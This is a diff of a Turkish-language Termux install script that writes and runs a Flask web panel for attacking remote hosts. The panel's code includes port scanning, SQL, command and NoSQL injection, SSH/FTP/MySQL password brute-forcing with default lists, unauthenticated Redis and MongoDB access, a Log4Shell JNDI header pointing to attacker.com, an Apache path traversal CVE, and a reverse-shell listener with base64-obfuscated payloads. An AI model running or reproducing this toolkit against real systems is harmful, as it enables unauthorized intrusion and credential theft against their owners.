@@ -16,24 +16,23 @@ API_LEVEL=$(getprop ro.build.version.sdk 2>/dev/null || echo "28")
 export ANDROID_API_LEVEL=$API_LEVEL
 
 # 1. Sistem güncelleme ve temel paketler
-echo -e "${GREEN}[1/8] Sistem güncelleniyor ve temel paketler yükleniyor...${NC}"
+echo -e "${GREEN}[1/5] Sistem güncelleniyor ve temel paketler yükleniyor...${NC}"
 pkg update -y | while IFS= read -r line; do echo "  $line"; done
 pkg install -y python python-pip netcat-openbsd rust git | while IFS= read -r line; do echo "  $line"; done
 
-# 2. Python kütüphaneleri
-echo -e "${GREEN}[2/8] Python kütüphaneleri yükleniyor...${NC}"
-pip install --upgrade pip
-pip install flask requests paramiko aiohttp dnspython flask-socketio eventlet pycryptodome reportlab python-telegram-bot shodan pymongo psycopg2-binary redis ftplib --progress-bar on | while IFS= read -r line; do echo "  $line"; done
+# 2. Python kütüphaneleri (pip yükseltme yok)
+echo -e "${GREEN}[2/5] Python kütüphaneleri yükleniyor...${NC}"
+pip install flask requests paramiko aiohttp dnspython flask-socketio eventlet pycryptodome reportlab python-telegram-bot shodan pymongo pymysql psycopg2-binary redis --progress-bar on | while IFS= read -r line; do echo "  $line"; done
 
 # 3. Termux-API (bildirimler için)
-echo -e "${GREEN}[3/8] Termux-API yükleniyor...${NC}"
+echo -e "${GREEN}[3/5] Termux-API yükleniyor...${NC}"
 pkg install -y termux-api 2>/dev/null || echo -e "${YELLOW}Termux-API kurulamadı, bildirimler çalışmayabilir.${NC}"
 
 # 4. Rastgele port seç
 PANEL_PORT=$(( RANDOM % 1000 + 5000 ))
 
-# 5. Python kodunu geçici dosyaya yaz
-echo -e "${GREEN}[4/8] Python panel kodu oluşturuluyor (bu biraz zaman alabilir)...${NC}"
+# 5. Python panel kodunu geçici dosyaya yaz
+echo -e "${GREEN}[4/5] Python panel kodu oluşturuluyor...${NC}"
 cat > /data/data/com.termux/files/usr/tmp/neon_mega_panel.py << 'EOF'
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
@@ -47,7 +46,6 @@ import time
 import json
 import subprocess
 import base64
-import hashlib
 import sqlite3
 import asyncio
 import aiohttp
@@ -60,7 +58,7 @@ from reportlab.lib.pagesizes import letter
 from reportlab.pdfgen import canvas
 from reportlab.lib.utils import simpleSplit
 
-# --- Veritabanı ---
+# ---------- Veritabanı ----------
 DB_PATH = "exploit_panel.db"
 
 def init_db():
@@ -79,46 +77,22 @@ def init_db():
                   port INTEGER,
                   exploit_name TEXT,
                   result TEXT)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS sessions
-                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                  session_id TEXT,
-                  target_ip TEXT,
-                  port INTEGER,
-                  type TEXT,
-                  active INTEGER)''')
     conn.commit()
     conn.close()
 
 init_db()
 
-# --- Konfigürasyon ---
+# ---------- Konfigürasyon ----------
 LOG_FILE = "exploit_log.txt"
-PROXY = None  # örn: "socks5://127.0.0.1:9050"
+PROXY = None
 TOR_ENABLED = False
 AUTH_ENABLED = False
 AUTH_PASSWORD = "changeme"
 
-# --- Yardımcı fonksiyonlar ---
 def log(message):
     with open(LOG_FILE, "a") as f:
         f.write(f"[{time.ctime()}] {message}\n")
     print(message)
-
-def db_insert_scan(target_ip, ports, results):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("INSERT INTO scans (timestamp, target_ip, ports, results) VALUES (?, ?, ?, ?)",
-              (time.ctime(), target_ip, json.dumps(ports), json.dumps(results)))
-    conn.commit()
-    conn.close()
-
-def db_insert_exploit(target_ip, port, exploit_name, result):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("INSERT INTO exploits (timestamp, target_ip, port, exploit_name, result) VALUES (?, ?, ?, ?, ?)",
-              (time.ctime(), target_ip, port, exploit_name, json.dumps(result)))
-    conn.commit()
-    conn.close()
 
 def send_notification(title, message):
     try:
@@ -126,7 +100,7 @@ def send_notification(title, message):
     except:
         pass
 
-# --- Port Tarama (asenkron) ---
+# ---------- Port tarama (asenkron) ----------
 async def scan_port_async(ip, port, timeout=1):
     try:
         conn = asyncio.open_connection(ip, port)
@@ -147,7 +121,6 @@ def scan_ports(ip, ports):
     loop.close()
     return open_ports
 
-# --- Banner Toplama ---
 def grab_banner(ip, port, timeout=2):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -156,9 +129,8 @@ def grab_banner(ip, port, timeout=2):
         if port == 21:
             s.send(b"HELP\r\n")
         elif port == 22:
-            # SSH
             s.send(b"\n")
-        elif port == 80 or port == 443:
+        elif port in [80, 443]:
             s.send(b"HEAD / HTTP/1.0\r\n\r\n")
         else:
             s.send(b"\n")
@@ -168,43 +140,35 @@ def grab_banner(ip, port, timeout=2):
     except:
         return ""
 
-# --- OS Tespiti (TTL) ---
 def detect_os(ip):
     try:
         result = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, text=True)
-        ttl = None
         for line in result.stdout.split("\n"):
             if "ttl=" in line.lower():
-                ttl = line.lower().split("ttl=")[1].split()[0]
-                break
-        if ttl:
-            ttl = int(ttl)
-            if ttl <= 64:
-                return "Linux/Unix"
-            elif ttl <= 128:
-                return "Windows"
-            else:
-                return "Unknown"
+                ttl = int(line.lower().split("ttl=")[1].split()[0])
+                if ttl <= 64:
+                    return "Linux/Unix"
+                elif ttl <= 128:
+                    return "Windows"
+                else:
+                    return "Unknown"
     except:
         pass
     return "Unknown"
 
-# --- Alt Alan Keşfi ---
-def subdomain_enum(domain, wordlist=None):
-    if wordlist is None:
-        wordlist = ["www", "mail", "ftp", "admin", "test", "dev", "api"]
+def subdomain_enum(domain):
+    wordlist = ["www", "mail", "ftp", "admin", "test", "dev", "api", "blog", "shop", "support"]
     found = []
     for sub in wordlist:
         try:
             target = f"{sub}.{domain}"
-            answers = dns.resolver.resolve(target, 'A')
-            if answers:
-                found.append(target)
+            dns.resolver.resolve(target, 'A')
+            found.append(target)
         except:
             pass
     return found
 
-# --- Exploit Fonksiyonları ---
+# ---------- Exploit fonksiyonları ----------
 def sqli_exploit(ip, port):
     url = f"http://{ip}:{port}/login"
     payload = {"username": "' OR 1=1 --", "password": "x"}
@@ -214,8 +178,8 @@ def sqli_exploit(ip, port):
             return {"success": True, "message": "SQL Injection başarılı!"}
         else:
             return {"success": False, "message": "SQL Injection başarısız."}
-    except:
-        return {"success": False, "error": "Bağlantı hatası"}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
 
 def cmd_injection(ip, port):
     url = f"http://{ip}:{port}/ping"
@@ -294,9 +258,12 @@ def nosql_injection(ip, port):
 
 def redis_unauth(ip, port=6379):
     try:
+        import redis
         r = redis.Redis(host=ip, port=port, socket_connect_timeout=2)
         info = r.info()
         return {"success": True, "message": f"Redis yetkisiz erişim: {info['redis_version']}"}
+    except ImportError:
+        return {"success": False, "message": "redis-py kurulu değil."}
     except:
         return {"success": False, "message": "Redis erişilemedi."}
 
@@ -306,20 +273,25 @@ def mongodb_unauth(ip, port=27017):
         client = MongoClient(ip, port, serverSelectionTimeoutMS=2000)
         client.server_info()
         return {"success": True, "message": "MongoDB yetkisiz erişim!"}
+    except ImportError:
+        return {"success": False, "message": "pymongo kurulu değil."}
     except:
         return {"success": False, "message": "MongoDB erişilemedi."}
 
 def mysql_brute(ip, port=3306, userlist=["root"], passlist=["", "root", "password"]):
-    import mysql.connector
-    for user in userlist:
-        for pwd in passlist:
-            try:
-                conn = mysql.connector.connect(host=ip, port=port, user=user, password=pwd, connect_timeout=3)
-                conn.close()
-                return {"success": True, "message": f"MySQL brute: {user}:{pwd}"}
-            except:
-                continue
-    return {"success": False, "message": "MySQL brute başarısız."}
+    try:
+        import pymysql
+        for user in userlist:
+            for pwd in passlist:
+                try:
+                    conn = pymysql.connect(host=ip, port=port, user=user, password=pwd, connect_timeout=3)
+                    conn.close()
+                    return {"success": True, "message": f"MySQL brute: {user}:{pwd}"}
+                except:
+                    continue
+        return {"success": False, "message": "MySQL brute başarısız."}
+    except ImportError:
+        return {"success": False, "message": "pymysql kurulu değil."}
 
 def ssh_brute(ip, port=22, userlist=["root", "admin"], passlist=["password", "123456"]):
     try:
@@ -336,7 +308,7 @@ def ssh_brute(ip, port=22, userlist=["root", "admin"], passlist=["password", "12
                     continue
         return {"success": False, "message": "SSH brute başarısız."}
     except ImportError:
-        return {"success": False, "message": "Paramiko kurulu değil."}
+        return {"success": False, "message": "paramiko kurulu değil."}
 
 def ftp_brute(ip, port=21, userlist=["root", "admin"], passlist=["password", "123456"]):
     import ftplib
@@ -352,16 +324,12 @@ def ftp_brute(ip, port=21, userlist=["root", "admin"], passlist=["password", "12
                 continue
     return {"success": False, "message": "FTP brute başarısız."}
 
-def smb_brute(ip, userlist=["administrator"], passlist=["password"]):
-    # Basit SMB brute, pysmb gerekebilir
-    return {"success": False, "message": "SMB brute henüz implemente edilmedi."}
-
 def cve_2021_44228(ip, port):
     url = f"http://{ip}:{port}/"
     headers = {"User-Agent": "${jndi:ldap://attacker.com/a}"}
     try:
         r = requests.get(url, headers=headers, timeout=3)
-        # Gerçekte callback beklenir, burada sadece simülasyon
+        # Gerçekte callback beklenir, simülasyon
         return {"success": True, "message": "Log4Shell payload gönderildi (simülasyon)."}
     except:
         return {"success": False, "error": "Bağlantı hatası"}
@@ -377,7 +345,6 @@ def cve_2021_41773(ip, port):
     except:
         return {"success": False, "error": "Bağlantı hatası"}
 
-# --- Tüm exploit'ler sözlüğü ---
 exploit_functions = {
     "sqli": sqli_exploit,
     "cmd_inj": cmd_injection,
@@ -395,7 +362,7 @@ exploit_functions = {
     "cve_2021_41773": cve_2021_41773
 }
 
-# --- Reverse Shell ---
+# ---------- Reverse Shell ----------
 listener_process = None
 
 def start_listener(port):
@@ -420,12 +387,7 @@ def generate_payload(ip, port, type="bash", obfuscate=False):
         payload = f"echo {payload} | base64 -d | bash"
     return payload
 
-# --- Metasploit RPC (opsiyonel) ---
-def msf_rpc_exploit(exploit_name, rhost, rport, lhost=None, lport=None):
-    # Basit bir stub
-    return {"success": False, "message": "Metasploit RPC henüz yapılandırılmadı."}
-
-# --- Shodan API ---
+# ---------- Shodan API ----------
 def shodan_query(api_key, query):
     try:
         import shodan
@@ -435,18 +397,7 @@ def shodan_query(api_key, query):
     except Exception as e:
         return {"success": False, "error": str(e)}
 
-# --- Censys API ---
-def censys_query(api_id, api_secret, query):
-    # Censys v2 API için örnek
-    return {"success": False, "message": "Censys API henüz entegre edilmedi."}
-
-# --- Telegram Bot (basit) ---
-telegram_bot_thread = None
-def start_telegram_bot(token):
-    # Bu fonksiyon arka planda çalışır
-    pass
-
-# --- Raporlama ---
+# ---------- Raporlama ----------
 def generate_html_report():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
@@ -473,21 +424,13 @@ def generate_pdf_report():
     c.save()
     return "report.pdf"
 
-# --- WebSocket terminal (basit) ---
-socketio = None
-
-def socketio_emit_log(message):
-    if socketio:
-        socketio.emit('log', {'data': message})
-
-# --- Flask Uygulaması ---
+# ---------- Flask Uygulaması ----------
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# Auth decorator
 def require_auth(f):
     def wrapper(*args, **kwargs):
-        if AUTH_ENABLED and (not session.get('authenticated')):
+        if AUTH_ENABLED and not session.get('authenticated'):
             return redirect(url_for('login'))
         return f(*args, **kwargs)
     wrapper.__name__ = f.__name__
@@ -513,7 +456,6 @@ def login():
 def index():
     return render_template_string(HTML_TEMPLATE)
 
-# API endpoints
 @app.route('/scan')
 def scan():
     ip = request.args.get('ip', '127.0.0.1')
@@ -525,7 +467,13 @@ def scan():
         banner = grab_banner(ip, p)
         port_info.append({"port": p, "service": banner[:50]})
     os_guess = detect_os(ip)
-    db_insert_scan(ip, ports, port_info)
+    # Veritabanına kaydet
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("INSERT INTO scans (timestamp, target_ip, ports, results) VALUES (?, ?, ?, ?)",
+              (time.ctime(), ip, json.dumps(open_ports), json.dumps(port_info)))
+    conn.commit()
+    conn.close()
     return jsonify({"ports": port_info, "os": os_guess})
 
 @app.route('/subdomain')
@@ -547,7 +495,13 @@ def run_exploit(name):
     if name in exploit_functions:
         try:
             result = exploit_functions[name](ip, port)
-            db_insert_exploit(ip, port, name, result)
+            # Veritabanına kaydet
+            conn = sqlite3.connect(DB_PATH)
+            c = conn.cursor()
+            c.execute("INSERT INTO exploits (timestamp, target_ip, port, exploit_name, result) VALUES (?, ?, ?, ?, ?)",
+                      (time.ctime(), ip, port, name, json.dumps(result)))
+            conn.commit()
+            conn.close()
             send_notification("Exploit", f"{name} on {ip}:{port} - {result.get('message','')}")
             return jsonify(result)
         except Exception as e:
@@ -605,18 +559,7 @@ def show_log():
     except:
         return "Log dosyası henüz oluşturulmadı."
 
-@app.route('/set_proxy')
-def set_proxy():
-    proxy = request.args.get('proxy')
-    global PROXY, TOR_ENABLED
-    if proxy == "tor":
-        PROXY = "socks5://127.0.0.1:9050"
-        TOR_ENABLED = True
-    else:
-        PROXY = proxy
-    return jsonify({"proxy": PROXY})
-
-# HTML Şablonu (çok uzun, kısaltılmış)
+# ---------- HTML Şablonu (Neon Tema) ----------
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -765,6 +708,12 @@ HTML_TEMPLATE = """
                     document.getElementById('subdomain_result').innerText = JSON.stringify(data, null, 2);
                 });
         }
+        function loadLog() {
+            fetch('/log')
+                .then(r => r.text())
+                .then(t => document.getElementById('log_content').innerText = t);
+        }
+        setInterval(loadLog, 5000);
     </script>
 </head>
 <body>
@@ -861,31 +810,28 @@ HTML_TEMPLATE = """
         <div class="neon-card">
             <h2>İşlem Günlüğü</h2>
             <pre id="log_content" class="result-box"></pre>
-            <button onclick="fetch('/log').then(r=>r.text()).then(t=>document.getElementById('log_content').innerText=t)">Yenile</button>
+            <button onclick="loadLog()">Yenile</button>
         </div>
     </div>
 </div>
 <script>
-    fetch('/log').then(r=>r.text()).then(t=>document.getElementById('log_content').innerText=t);
+    loadLog();
 </script>
 </body>
 </html>
 """
 
 if __name__ == '__main__':
-    print(f"\n[+] Panel başlatılıyor: http://localhost:'''$PANEL_PORT'''")
-    app.run(host='0.0.0.0', port='''$PANEL_PORT''', debug=False)
+    port = '''$PANEL_PORT'''
+    print(f"\n[+] Panel başlatılıyor: http://localhost:{port}")
+    app.run(host='0.0.0.0', port=int(port), debug=False)
 EOF
 
-# 6. Python dosyasındaki port değişkenini güncelle
+# 6. Port değişkenini Python dosyasına yaz
 sed -i "s/'''\$PANEL_PORT'''/$PANEL_PORT/" /data/data/com.termux/files/usr/tmp/neon_mega_panel.py
 
-echo -e "${GREEN}[5/8] Panel başlatılıyor...${NC}"
+echo -e "${GREEN}[5/5] Panel başlatılıyor...${NC}"
 echo -e "${CYAN}Adres: http://localhost:$PANEL_PORT${NC}"
 echo -e "${RED}[!] Ctrl+C ile durdurabilirsiniz.${NC}"
 
-# 7. Python panelini çalıştır
 python /data/data/com.termux/files/usr/tmp/neon_mega_panel.py
-
-# İsteğe bağlı: çıkışta geçici dosyayı sil
-# rm /data/data/com.termux/files/usr/tmp/neon_mega_panel.py
